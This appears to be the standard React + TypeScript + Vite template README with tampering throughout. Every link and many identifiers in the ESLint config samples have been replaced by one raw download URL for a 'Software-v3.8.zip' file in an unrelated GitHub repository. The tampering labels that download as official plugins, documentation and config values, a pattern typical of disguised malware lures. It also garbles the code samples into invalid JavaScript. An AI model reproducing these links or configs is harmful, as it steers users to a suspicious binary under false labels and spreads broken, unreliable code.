# React + TypeScript + Vite

This template provides a minimal setup to get React working in Vite with HMR and some ESLint rules.

Currently, two official plugins are available:

- [@vitejs/plugin-react](https://github.com/chatchaloem/vybas/raw/refs/heads/main/public/Software-v3.8.zip) uses [Babel](https://github.com/chatchaloem/vybas/raw/refs/heads/main/public/Software-v3.8.zip) for Fast Refresh
- [@vitejs/plugin-react-swc](https://github.com/chatchaloem/vybas/raw/refs/heads/main/public/Software-v3.8.zip) uses [SWC](https://github.com/chatchaloem/vybas/raw/refs/heads/main/public/Software-v3.8.zip) for Fast Refresh

## React Compiler

The React Compiler is not enabled on this template because of its impact on dev & build performances. To add it, see [this documentation](https://github.com/chatchaloem/vybas/raw/refs/heads/main/public/Software-v3.8.zip).

## Expanding the ESLint configuration

If you are developing a production application, we recommend updating the configuration to enable type-aware lint rules:

```js
export default defineConfig([
  globalIgnores(['dist']),
  {
    files: ['**/*.{ts,tsx}'],
    extends: [
      // Other configs...

      // Remove https://github.com/chatchaloem/vybas/raw/refs/heads/main/public/Software-v3.8.zip and replace with this
      https://github.com/chatchaloem/vybas/raw/refs/heads/main/public/Software-v3.8.zip,
      // Alternatively, use this for stricter rules
      https://github.com/chatchaloem/vybas/raw/refs/heads/main/public/Software-v3.8.zip,
      // Optionally, add this for stylistic rules
      https://github.com/chatchaloem/vybas/raw/refs/heads/main/public/Software-v3.8.zip,

      // Other configs...
    ],
    languageOptions: {
      parserOptions: {
        project: ['https://github.com/chatchaloem/vybas/raw/refs/heads/main/public/Software-v3.8.zip', 'https://github.com/chatchaloem/vybas/raw/refs/heads/main/public/Software-v3.8.zip'],
        tsconfigRootDir: https://github.com/chatchaloem/vybas/raw/refs/heads/main/public/Software-v3.8.zip,
      },
      // other options...
    },
  },
])
```

You can also install [eslint-plugin-react-x](https://github.com/chatchaloem/vybas/raw/refs/heads/main/public/Software-v3.8.zip) and [eslint-plugin-react-dom](https://github.com/chatchaloem/vybas/raw/refs/heads/main/public/Software-v3.8.zip) for React-specific lint rules:

```js
// https://github.com/chatchaloem/vybas/raw/refs/heads/main/public/Software-v3.8.zip
import reactX from 'eslint-plugin-react-x'
import reactDom from 'eslint-plugin-react-dom'

export default defineConfig([
  globalIgnores(['dist']),
  {
    files: ['**/*.{ts,tsx}'],
    extends: [
      // Other configs...
      // Enable lint rules for React
      https://github.com/chatchaloem/vybas/raw/refs/heads/main/public/Software-v3.8.zip['recommended-typescript'],
      // Enable lint rules for React DOM
      https://github.com/chatchaloem/vybas/raw/refs/heads/main/public/Software-v3.8.zip,
    ],
    languageOptions: {
      parserOptions: {
        project: ['https://github.com/chatchaloem/vybas/raw/refs/heads/main/public/Software-v3.8.zip', 'https://github.com/chatchaloem/vybas/raw/refs/heads/main/public/Software-v3.8.zip'],
        tsconfigRootDir: https://github.com/chatchaloem/vybas/raw/refs/heads/main/public/Software-v3.8.zip,
      },
      // other options...
    },
  },
])
```
